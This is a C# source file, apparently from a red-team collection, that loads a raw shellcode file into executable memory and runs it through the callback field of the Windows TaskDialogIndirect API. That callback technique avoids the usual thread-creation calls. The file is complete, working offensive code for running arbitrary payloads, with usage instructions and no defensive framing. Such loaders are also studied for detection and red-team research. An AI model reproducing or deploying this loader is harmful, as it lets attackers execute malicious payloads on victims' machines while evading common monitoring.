// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 only
// Usage: this.exe <shellcode file>

//Steps for use:
// 1. Add/Uncomment these lines from the app.manifest:
/*
    < dependentAssembly >
      < assemblyIdentity
      type = "win32"
      name = "Microsoft.Windows.Common-Controls"
      version = "6.0.0.0"
      processorArchitecture = "*"
      publicKeyToken = "6595b64144ccf1df"
      language = "*"
    />
    </ dependentAssembly >
*/
// For more information, see the Notes section of https://www.pinvoke.net/default.aspx/comctl32.taskdialogindirect

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace TaskDialogIndirect
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: TaskDialogIndirect.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            TaskDialogConfig sTDC = new TaskDialogConfig();
            sTDC.cbSize = (uint)Marshal.SizeOf(typeof(TaskDialogConfig));
            sTDC.pfCallback = hAlloc;
            
            TaskDialogIndirect(ref sTDC, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("comctl32.dll", ExactSpelling = true, CharSet = CharSet.Unicode)]
        static extern uint TaskDialogIndirect (
            [In] ref TaskDialogConfig pTaskConfig,
            IntPtr pnButton, //Optional
            IntPtr pnRadioButton, //Optional
            IntPtr pfverificationFlagChecked); //Optional

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto, Pack = 1)]
        public struct TaskDialogConfig
        {
            public uint cbSize;
            public IntPtr hwndParent;
            public IntPtr hInstance;
            public uint dwFlags;
            public uint dwCommonButtons;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszWindowTitle;
            public IntPtr hMainIcon;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszMainInstruction;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszContent;
            public uint cButtons;
            public IntPtr pButtons;
            public int nDefaultButton;
            public uint cRadioButtons;
            public IntPtr pRadioButtons;
            public int nDefaultRadioButton;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszVerificationText;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszExpandedInformation;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszExpandedControlText;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszCollapsedControlText;
            public IntPtr hFooterIcon;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszFooter;
            public IntPtr pfCallback;
            public IntPtr lpCallbackData;
            public uint cxWidth;
        }
    }
}
